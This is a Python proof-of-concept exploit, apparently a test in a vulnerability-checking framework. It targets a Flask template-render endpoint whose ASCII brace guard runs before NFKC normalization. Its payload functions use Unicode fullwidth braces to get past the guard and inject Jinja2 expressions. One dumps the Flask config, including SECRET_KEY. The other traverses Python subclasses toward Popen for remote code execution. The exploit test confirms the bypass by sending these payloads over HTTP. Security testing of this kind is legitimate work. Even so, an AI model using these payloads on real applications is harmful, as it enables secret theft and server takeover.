"""PoC: Jinja2 SSTI via NFKC normalization applied AFTER ASCII brace guard (CWE-94).

Stage 3 inserts `unicodedata.normalize('NFKC', converted)` between the
`{` / `}` guard check and `render_template_string`. The guard rejects
ASCII braces `{` / `}`, but Unicode fullwidth braces U+FF5B (`｛`) and
U+FF5D (`｝`) pass through — their NFKC form is `{` and `}`.

After normalization the payload becomes a real Jinja2 expression that
reaches `render_template_string` with full Flask context, enabling
SSTI → RCE.

Exploit:
    POST /api/templates/render
    { "template": "｛｛ config.items() ｝｝" }

The ascii brace guard sees only fullwidth chars → passes. NFKC turns
them into `{{ config.items() }}`. Jinja evaluates `config.items()` and
returns Flask config (SECRET_KEY, DEBUG, etc.) in the response.

For a verifiable signal, we use `｛% for c in ().__class__...%｝` to
reach `os.popen`. Safer probe: exfiltrate Flask config (`SECRET_KEY`)
which is never present in the benign response.
"""

from __future__ import annotations

import secrets

from mosaic.oracle.exploit import ExploitTest

# Fullwidth brace code points — NFKC normalizes to ASCII `{` and `}`
_FW_OPEN = "\uFF5B"   # ｛
_FW_CLOSE = "\uFF5D"  # ｝


def _payload_config_leak() -> str:
    """Jinja2 expression that dumps Flask app.config via fullwidth braces."""
    return f"{_FW_OPEN}{_FW_OPEN} config.items() {_FW_CLOSE}{_FW_CLOSE}"


def _payload_rce() -> str:
    """Jinja2 SSTI that executes `id` via subclass traversal."""
    # Access os module through Python class hierarchy, then popen('id').
    expr = (
        "{{ ''.__class__.__mro__[1].__subclasses__()"
        "|selectattr('__name__','equalto','Popen')|list|first"
        "}}"
    )
    # Replace ASCII `{{ }}` with fullwidth versions so the guard misses it.
    return expr.replace("{{", _FW_OPEN * 2).replace("}}", _FW_CLOSE * 2)


class FlaskNfkcSstiExploit(ExploitTest):
    @property
    def chain_id(self) -> str:
        return "flask_ssti_fullwidth_braces"

    def execute(self) -> tuple[bool, str]:
        # Sanity: endpoint accepts benign %var% template
        benign = self.http_post(
            "/api/templates/render",
            json={"template": "Hello %name%", "context": {"name": "world"}},
        )
        if not benign.ok or "Hello world" not in (benign.text or ""):
            return False, f"Render endpoint missing/broken. Status={benign.status_code} body={benign.text[:200]!r}"

        # Sanity: ASCII-brace guard still rejects raw `{`
        blocked = self.http_post(
            "/api/templates/render",
            json={"template": "{{ config }}", "context": {}},
        )
        if blocked.status_code != 400:
            return False, f"ASCII brace guard not active (status={blocked.status_code})"

        # Exploit: fullwidth braces bypass guard, NFKC materializes Jinja syntax.
        payload = _payload_config_leak()
        r = self.http_post(
            "/api/templates/render",
            json={"template": payload, "context": {}},
        )
        body = r.text or ""
        # Evidence: Flask config items leak keys like 'SECRET_KEY', 'DEBUG', 'SERVER_NAME'
        if r.status_code == 200 and ("SECRET_KEY" in body or "DEBUG" in body or "PERMANENT_SESSION_LIFETIME" in body):
            return True, (
                f"SSTI via NFKC-after-brace-guard confirmed (CWE-94). "
                f"Fullwidth-brace payload bypassed the ASCII `{{`/`}}` guard, "
                f"NFKC rewrote to `{{{{ config.items() }}}}`, Jinja evaluated. "
                f"Response leaked Flask config. Body excerpt: {body[:400]!r}"
            )

        return False, (
            f"No SSTI signal. render ok, guard active, but fullwidth payload gave "
            f"status={r.status_code} body[:300]={body[:300]!r}"
        )
